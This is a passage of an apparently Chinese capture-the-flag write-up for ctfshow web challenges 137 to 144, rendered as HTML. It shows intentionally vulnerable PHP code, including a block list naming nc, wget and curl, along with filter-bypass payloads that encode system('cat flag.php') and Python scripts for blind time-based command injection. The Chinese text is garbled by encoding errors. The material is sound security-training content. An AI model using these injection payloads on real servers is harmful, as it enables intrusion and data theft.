single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>tee</code>Áî®‰∫éÊòæÁ§∫Á®ãÂ∫èÁöÑËæìÂá∫Âπ∂Â∞ÜÂÖ∂Â§çÂà∂Âà∞‰∏Ä‰∏™Êñá‰ª∂‰∏≠„ÄÇ</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>ËøáÊª§‰∫Ü::‰ΩÜÊòØÂèØ‰ª•Áî®Êï∞ÁªÑ</p><h4 id="web139-ÂëΩ‰ª§Áõ≤Ê≥®"><a href="#web139-ÂëΩ‰ª§Áõ≤Ê≥®" class="headerlink" title="web139(ÂëΩ‰ª§Áõ≤Ê≥®)"></a>web139(ÂëΩ‰ª§Áõ≤Ê≥®)</h4><p>‰ΩøÁî®teeÂèëÁé∞Ê≤°ÊúâÂõûÊòæÔºåÂèØ‰ª•‰ΩøÁî®ÂëΩ‰ª§Áõ≤Ê≥®</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'_~'</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#Ë°å</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#Âàó</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#awk 'NR==&#123;0&#125;'ÈÄêË°åËæìÂá∫Ëé∑Âèñ</span>        <span class="token comment">#cut -c &#123;1&#125; Êà™ÂèñÂçï‰∏™Â≠óÁ¨¶</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'~'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>                result<span class="token operator">+=</span><span class="token string">" "</span></code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">phpÊØîËæÉÁªïËøáÔºàÂº∫ÊØîËæÉ‚Äú&#x3D;&#x3D;&#x3D;‚Äù&#x2F;Âº±ÊØîËæÉ‚Äú&#x3D;&#x3D;‚ÄúÔºâ</a></p><p>Âõ†‰∏∫ÊòØ<code>==</code>ÔºåÂ≠óÁ¨¶‰∏≤ÂíåÊï∞Â≠óÊØîËæÉÊó∂Ôºå‰ºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ÂÖàËΩ¨ÂåñÊàêÊï∞Â≠óÁ±ªÂûãÂú®ËøõË°åÊØîËæÉ„ÄÇ</p><p>Â≠óÁ¨¶‰∏≤‰ª•Êï∞Â≠óÂºÄÂ§¥Êó∂Ôºå‰ª•ÂºÄÂ§¥Êï∞Â≠óÔºàÂà∞Â≠óÊØçÂá∫Áé∞Êà™Ê≠¢Ôºâ‰Ωú‰∏∫ËΩ¨Êç¢ÁªìÊûúÔºõÂºÄÂ§¥‰∏çÊòØÊï∞Â≠óÁöÑÂ≠óÁ¨¶‰∏≤ÊàñÁ©∫ÔºànullÔºâÔºåÂàôËΩ¨Êç¢‰∏∫0„ÄÇ</p><blockquote><p>‚Äò12‚Äô&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>‚Äò12abc‚Äô&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>‚Äòadm2n‚Äô&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>ÊâÄ‰ª•Âè™ÈúÄË¶Å$codeÁöÑÂÄº‰∏ç‰∏∫1ÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶‰∏≤Âç≥ÂèØÔºå‰∫éÊòØÊûÑÈÄ†ËÆ©ÂÖ∂ËøîÂõû0</p><blockquote><p>intval() ÊàêÂäüÊó∂ÔºåËøîÂõûÂèÇÊï∞ÁöÑ integer ÂÄºÔºåÂ§±Ë¥•Êó∂ËøîÂõû 0„ÄÇÁ©∫ÁöÑ array ËøîÂõû 0ÔºåÈùûÁ©∫ÁöÑ array ËøîÂõû 1„ÄÇ<br>Â≠óÁ¨¶‰∏≤ÊúâÂèØËÉΩËøîÂõû 0ÔºåÂèñÂÜ≥‰∫éÂ≠óÁ¨¶‰∏≤ÊúÄÂ∑¶‰æßÁöÑÂ≠óÁ¨¶„ÄÇ<br>intval() ‰∏çËÉΩÁî®‰∫é objectÔºåÂê¶Âàô‰ºö‰∫ßÁîü E_NOTICE ÈîôËØØÂπ∂ËøîÂõû 1„ÄÇ</p></blockquote><p>Payload:</p><blockquote><p>system(system())‚Äî&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )ÔºöÊàêÂäüÂàôËøîÂõûÂëΩ‰ª§ËæìÂá∫ÁöÑÊúÄÂêé‰∏ÄË°åÔºåÂ§±Ë¥•ÂàôËøîÂõû FALSE „ÄÇsystem()ÂøÖÈ°ªÂåÖÂê´ÂèÇÊï∞ÔºåÂ§±Ë¥•ËøîÂõûFLASEÔºõsystem(‚ÄòFLASE‚Äô)ÔºåÁ©∫Êåá‰ª§ÔºåÂ§±Ë¥•ËøîÂõûFLASE„ÄÇ</p><p>usleep(usleep())‚Äî&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleepÊ≤°ÊúâËøîÂõûÂÄº„ÄÇ ÊâÄ‰ª•intvalÂèÇÊï∞‰∏∫Á©∫ÔºåÂ§±Ë¥•ËøîÂõû0</p><p>getdate(getdate())‚Äî&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )ÔºöËøîÂõûÁªìÊûúÊòØarrayÔºåÂèÇÊï∞ÂøÖÈ°ªÊòØintÂûã„ÄÇÊâÄ‰ª•getdate(getdate())‚Äî-&gt;getdate(arrayÂûã)‚Äî&gt;Â§±Ë¥•ËøîÂõûflaseÔºåintval‰∏∫0„ÄÇ</p></blockquote><h4 id="web141-ÂáΩÊï∞‰∏éÊï∞Â≠óËøêÁÆó"><a href="#web141-ÂáΩÊï∞‰∏éÊï∞Â≠óËøêÁÆó" class="headerlink" title="web141(ÂáΩÊï∞‰∏éÊï∞Â≠óËøêÁÆó)"></a>web141(ÂáΩÊï∞‰∏éÊï∞Â≠óËøêÁÆó)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>\W</strong>Ôºö‰∏é‰ªª‰ΩïÈùûÂçïËØçÂ≠óÁ¨¶ÂåπÈÖç„ÄÇÂ∞±ÊòØÈô§‰∫ÜÊï∞Â≠ó„ÄÅÂ≠óÊØç„ÄÅ‰∏ãÂàíÁ∫ø„ÄÇÁ≠â‰ª∑‰∫é<code>[^A-Za-z0-9_]</code></p><p>phpÈáåÊï∞Â≠óÂèØ‰ª•ÂíåÂëΩ‰ª§ÂèØ‰ª•ËøõË°åËøêÁÆó„ÄÇ‰πüÂ∞±ÊòØËØ¥v3ÈáåË¶ÅÊâßË°åÁöÑÂáΩÊï∞ÂâçÂêéÂä†‰∏äËøêÁÆóÁ¨¶Âç≥ÂèØ„ÄÇ</p><p>‰∏æ‰æãÁêÜËß£‰∏Ä‰∏ãÔºö<code>1-phpinfo()-1</code>ÁöÑÁªìÊûú‰∏∫0Ôºåphpinfo()ÊâßË°åÊàêÂäüËøîÂõûtrueÔºå1-1-1&#x3D;-1„ÄÇ</p><p>ÂêåÁêÜ<code>system()</code>‰πüÂèØÊâßË°å„ÄÇ</p><p>ÂèñÂèç<code>~</code>ÂºÇÊàñ<code>^</code>Êàñ<code>|</code>ÈÉΩÂèØ‰ª•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(‚Äú%13%19%13%14%05%0d‚Äù|‚Äù%60%60%60%60%60%60‚Äù)(‚Äú%03%01%14%00%06%0c%01%07%00%10%08%10‚Äù|‚Äù%60%60%60%20%60%60%60%60%2e%60%60%60‚Äù)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>‚Äò%8C%86%8C%8B%9A%92‚Äô)(</del>‚Äò%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F‚Äô)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p>0Âíå0x0ÁªïËøá ËøôÈáåÁªïËøáÂõ†‰∏∫ÊòØÂõ†‰∏∫ÂΩìÊàê‰∫Ü8ËøõÂà∂Âíå16ËøõÂà∂</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Âêå142Ôºåban‰∫ÜÂèñÂèçÂíåÊàñÂêåÊó∂‰πüban‰∫Ü+-ÂèØ‰ª•‰ΩøÁî®*ÔºåÂ•ΩÂÉèÊ≤°banÂºÇÊàñ<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token 